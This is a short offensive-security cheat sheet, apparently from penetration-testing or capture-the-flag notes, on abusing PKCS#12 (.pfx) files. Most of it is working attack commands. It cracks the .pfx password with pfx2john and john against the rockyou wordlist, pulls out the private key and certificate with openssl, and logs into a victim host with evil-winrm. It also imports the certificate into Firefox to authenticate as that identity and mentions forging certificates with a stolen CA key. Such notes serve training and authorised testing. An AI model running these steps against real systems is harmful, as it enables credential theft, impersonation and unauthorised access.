
# <span style="color:#FF5555">What a .pfx file is</span>

A `.pfx` (a.k.a. PKCS#12 / `.p12`) is a single password-protected file that bundles together:

- A **private key**
- The matching **public certificate**
- Optionally, the certificate chain (CA certs)

Because it contains a private key, an attacker can **impersonate whoever the certificate belongs to** — a user, a service account, or a domain controller. A CA's `.pfx` (the Enterprise CA private key) is especially dangerous: cracking it lets you forge certs for **any** user (**Golden Certificate**).

If password protected then
```bash
pfx2john legacyy_dev_auth.pfx > john.key  
john --wordlist=$WORDLIST_PATH/rockyou.txt john.key

# .py variant on some distros; view a cracked password later:
pfx2john.py staff.pfx > staff.pfx.hash
john --wordlist=$WORDLIST_PATH/rockyou.txt staff.pfx.hash
john --show staff.pfx.hash
```

Getting the public and private keys
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes  
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

Accessing the system
```bash
evil-winrm -S -i $VICTIM_IP -c cert.pem -k key.pem
```

# <span style="color:#FF5555">Using a client cert in the browser (mutual TLS)</span>

Some AD-hosted sites (e.g. PowerShell Web Access) ask the client for a certificate. Import the `.pfx` into **Firefox** (Settings → Privacy & Security → Certificates → Your Certificates → Import). Then load/refresh the site over **HTTPS** — Firefox prompts you to send the cert; click OK to authenticate as that identity.